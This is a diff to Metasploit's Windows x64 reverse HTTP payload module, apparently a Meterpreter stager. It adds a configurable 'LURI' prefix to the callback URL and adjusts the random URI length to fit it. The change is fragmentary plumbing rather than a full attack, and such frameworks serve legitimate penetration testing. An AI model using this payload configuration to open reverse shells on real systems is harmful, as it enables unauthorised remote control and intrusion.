@@ -55,7 +55,7 @@ module Payload::Windows::ReverseHttp_x64
 
     # add extended options if we do have enough space
     unless self.available_space.nil? || required_space > self.available_space
-      conf[:url]        = generate_uri
+      conf[:url]        = datastore['LURI'] + generate_uri
       conf[:exitfunk]   = datastore['EXITFUNC']
       conf[:ua]         = datastore['MeterpreterUserAgent']
       conf[:proxy_host] = datastore['PayloadProxyHost']
@@ -96,7 +96,8 @@ module Payload::Windows::ReverseHttp_x64
 
     # Choose a random URI length between 30 and 255 bytes
     if uri_req_len == 0
-      uri_req_len = 30 + rand(256-30)
+      uri_req_len = 30 + datastore['LURI'].length + rand(256-(30+datastore['LURI'].length))
+
     end
 
     if uri_req_len < 5
